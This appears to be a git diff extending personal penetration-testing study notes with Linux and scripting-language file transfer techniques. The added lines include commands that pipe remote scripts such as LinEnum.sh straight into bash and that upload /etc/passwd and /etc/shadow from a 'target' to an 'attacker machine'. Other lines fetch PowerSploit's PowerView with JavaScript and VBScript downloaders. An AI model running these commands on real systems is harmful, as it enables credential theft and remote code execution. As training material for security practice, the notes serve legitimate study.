@@ -1,6 +1,8 @@
 # File Transfers
 
 1. [Windows File Transfer Methods](#windows-file-transfer-methods)
+1. [Linux File Transfer Methods](#linux-file-transfer-methods)
+1. [Transferring Files with Code](#transferring-files-with-code)
 
 ## Windows File Transfer Methods
 
@@ -217,3 +219,221 @@
     echo bye >> ftpcommand.txt
     ftp -v -n -s:ftpcommand.txt
     ```
+
+## Linux File Transfer Methods
+
+* Download operations: (download to Linux)
+
+  * Base64 encoding/decoding:
+
+    ```shell
+    # on attacker machine
+    md5sum id_rsa
+
+    cat id_rsa | base64 -w 0; echo
+    # encode to base64
+    ```
+
+    ```shell
+    # on target machine
+    echo -n "<base64-encoded string>" | base64 -d > id_rsa
+    # decode file
+
+    md5sum id_rsa
+    # confirm hashes match
+    ```
+  
+  * Web downloads with ```wget``` and ```curl```:
+
+    ```shell
+    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+    # download using wget
+
+    curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+    # download using curl
+    ```
+
+  * Fileless attacks:
+
+    ```shell
+    curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+    # fileless download with curl
+
+    wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+    # fileless download with wget
+    ```
+
+  * Download with Bash (```/dev/tcp```):
+
+    ```shell
+    exec 3<>/dev/tcp/10.10.10.32/80
+    # connect to target webserver
+
+    echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+    # HTTP GET request
+
+    cat <&3
+    # print the response
+    ```
+
+  * SSH downloads:
+
+    ```shell
+    # on attacker machine
+    sudo systemctl enable ssh
+
+    sudo systemctl start ssh
+    # setup and start ssh server
+
+    netstat -lnpt
+    # check for ssh listening port
+    ```
+
+    ```shell
+    # on target machine
+    # use scp utility
+    scp plaintext@192.168.49.128:/root/myroot.txt .
+    ```
+
+* Upload operations (upload from Linux):
+
+  * Web upload:
+
+    ```shell
+    # on attacker machine
+    sudo python3 -m pip install --user uploadserver
+
+    openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+    # generate self-signed cert
+
+    mkdir https && cd https
+
+    sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
+    # this starts the server
+    ```
+
+    ```shell
+    # on target machine
+    curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+    # upload multiple files
+    # --insecure flag used for self-signed cert
+    ```
+  
+  * Alternative web file transfer:
+
+    ```shell
+    # on target machine
+    # multiple ways to start a web server
+    # depending on whatever language is setup on target
+
+    python3 -m http.server
+
+    python2.7 -m SimpleHTTPServer
+
+    php -S 0.0.0.0:8000
+
+    ruby -run -ehttpd . -p8000
+    ```
+
+    ```shell
+    # download file to attacker machine
+    wget 192.168.49.128:8000/filetotransfer.txt
+    ```
+
+  * SCP upload:
+
+    ```shell
+    # on target machine
+    # if outbound SSH connection is allowed
+    scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
+    ```
+
+## Transferring Files with Code
+
+* Python:
+
+  ```shell
+  # python 2
+  python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+  # python 3
+  python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+  ```
+
+  ```shell
+  # to upload using python3
+  # on attacker machine
+  python3 -m uploadserver
+
+  # on target machine
+  python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd", "rb")})'
+  ```
+
+* PHP:
+
+  ```shell
+  # using file_get_contents() and file_put_contents()
+  php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+  # -r is used to run one-liners
+
+  # alternatively, we can use fopen()
+  php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+  # we can download a file and pipe it to bash
+  # @file works if fopen wrappers are enabled
+  php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+  ```
+
+* Ruby:
+
+  ```shell
+  # -e for one-liners
+  ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+  ```
+
+* Perl:
+
+  ```shell
+  perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+  ```
+
+* JavaScript:
+
+  ```js
+  var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+  WinHttpReq.Send();
+  BinStream = new ActiveXObject("ADODB.Stream");
+  BinStream.Type = 1;
+  BinStream.Open();
+  BinStream.Write(WinHttpReq.ResponseBody);
+  BinStream.SaveToFile(WScript.Arguments(1));
+
+  // save this script as wget.js
+  ```
+
+  ```shell
+  # to download file
+  cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+  ```
+
+* VBScript:
+
+  ```vbscript
+  dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+  dim bStrm: Set bStrm = createobject("Adodb.Stream")
+  xHttp.Open "GET", WScript.Arguments.Item(0), False
+  xHttp.Send
+
+  with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+  end with
+  ```
+
+  ```shell
+  # download file
+  cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+  ```
